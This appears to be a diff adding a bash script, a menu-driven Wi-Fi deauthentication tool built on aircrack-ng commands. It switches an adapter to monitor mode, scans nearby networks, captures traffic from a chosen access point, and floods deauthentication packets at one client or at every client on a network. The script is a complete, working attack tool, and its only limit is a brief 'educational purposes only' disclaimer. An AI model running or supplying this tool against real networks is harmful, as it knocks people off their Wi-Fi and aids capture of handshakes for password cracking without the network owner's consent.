@@ -1,0 +1,162 @@
+#!/bin/bash
+
+# Wi-Fi Deauthentication Tool
+# echo "This tool is created by mrwhoseanartist"
+
+function require_root() {
+    echo ">> This script must be run as root."
+    exit 1
+}
+if [ "$(id -u)" -ne 0 ]; then
+    require_root
+fi
+
+is_monitor_mode() {
+    local iface="$1"
+    local mode=$(iw dev "$iface" info 2>/dev/null | grep 'type' | awk '{print $2}')
+    [ "$mode" == "monitor" ]
+}
+
+wifi_interface="wlan0"
+mon="mon"
+monitor_interface="${wifi_interface}${mon}"
+
+display_menu() {
+    echo "-----------------------------------------------"
+    echo "### Wi-Fi Deauthentication Tool ###"
+    echo "1. Check Wi-Fi Adapter Status"
+    echo "2. Change Wi-Fi Adapter to MONITOR MODE"
+    echo "3. Change Wi-Fi Adapter to MANAGED MODE"
+    echo "4. Scan for NEARBY Wi-Fi networks"
+    echo "5. Select a Wi-Fi network for further actions"
+    echo "6. Deauthenticate a client from Wi-Fi network"
+    echo "7. Deauthenticate all clients from Wi-Fi network"
+    echo "8. Exit"
+    echo "-------------------------------------------------"
+    echo "Enter your choice:"
+    read choice
+}
+
+check_wifi() {
+    echo "### Wi-Fi Adapter Status ###"
+    for iface in $(iw dev | grep Interface | awk '{print $2}'); do
+        echo ">> $iface: $(iw dev $iface info | grep "type" | awk '{print $2}')"
+    done
+}
+
+monitor_mode() {
+    echo "### Turning on Monitor Mode ###"
+    sudo airmon-ng check kill 2>/dev/null
+    sudo airmon-ng start $wifi_interface 2>/dev/null
+    sudo airmon-ng 
+}
+
+managed_mode() {
+    echo "### Turning on Managed Mode ###"
+    sudo airmon-ng stop ${wifi_interface}${mon} 2>/dev/null
+    sudo systemctl start NetworkManager 2>/dev/null
+}
+
+
+select_wifi() {
+    if is_monitor_mode "${wifi_interface}${mon}"; then
+        echo "Enter the BSSID of the Wi-Fi network:"
+        read wifi_bssid
+        echo "Enter the channel of the Wi-Fi network:"
+        read channel
+        echo "Enter the name of the capture file:"
+        read capture
+        echo "Starting monitoring on the selected network..."
+    open_new_terminal "airodump-ng -w $capture --bssid $wifi_bssid --channel $channel ${wifi_interface}${mon}"
+    else
+        echo ">> Error: The Wi-Fi adapter needs to be in monitor mode."
+    fi
+}
+
+deauth_client() {
+    if is_monitor_mode "${wifi_interface}${mon}"; then
+        echo "Enter the number of deauthentication packets to send:"
+        read deauth_packets
+        echo "Enter the BSSID of the Wi-Fi network:"
+        read wifi_bssid
+        echo "Enter the client MAC address to deauthenticate:"
+        read client_mac
+        echo "Sending deauthentication packets..."
+    open_new_terminal "aireplay-ng --deauth $deauth_packets -a $wifi_bssid -c $client_mac ${wifi_interface}${mon}"
+    else
+        echo ">> Error: The Wi-Fi adapter needs to be in monitor mode."
+    fi
+}
+
+
+echo ""
+
+echo " =====================Disclaimer========================"
+echo "| This tool is provided for educational purposes only.  |"
+echo "| It should not be used for illegal activities.         |"
+echo "| Only use this tool on the wifi network                |"
+echo "| which you own or have permission to test.             |"
+echo " ======================================================="
+
+echo ""
+
+read -p "Press any key to continue..."
+clear
+
+open_new_terminal() {
+    local command="$1"
+    gnome-terminal -- bash -c "$command; exec bash"
+}
+
+while true; do
+    display_menu
+    clear
+    case $choice in
+        1)  
+            echo " " 
+            check_wifi 
+            ;;
+        2)
+            monitor_mode
+            ;;
+        3)
+            managed_mode
+            ;;
+        4)
+            # scan_wifi
+            if is_monitor_mode "$monitor_interface"; then
+                open_new_terminal "airodump-ng $monitor_interface"
+            else 
+                echo ">> Error: The Wi-Fi adapter needs to be in monitor mode."
+            fi
+            ;;
+        5)
+            select_wifi
+            ;;
+        6)
+            deauth_client
+            ;;
+        7)
+            #deauth_all_clients
+            if is_monitor_mode "$monitor_interface"; then
+                echo "Enter the number of deauthentication packets to send:"
+                read deauth_packets
+                echo "Enter the BSSID of the Wi-Fi network:"
+                read wifi_bssid
+                echo "Sending deauthentication packets to all clients..."
+                open_new_terminal "aireplay-ng --deauth $deauth_packets -a $wifi_bssid "$monitor_interface""
+            else
+                echo "Error: The Wi-Fi adapter needs to be in monitor mode."
+            fi
+            ;;
+        8)
+            echo ">> GOODBYE..."
+            break
+            ;;
+        *)
+            echo ">> Invalid Choice. Please try again."
+            ;;
+    esac
+
+    echo
+done
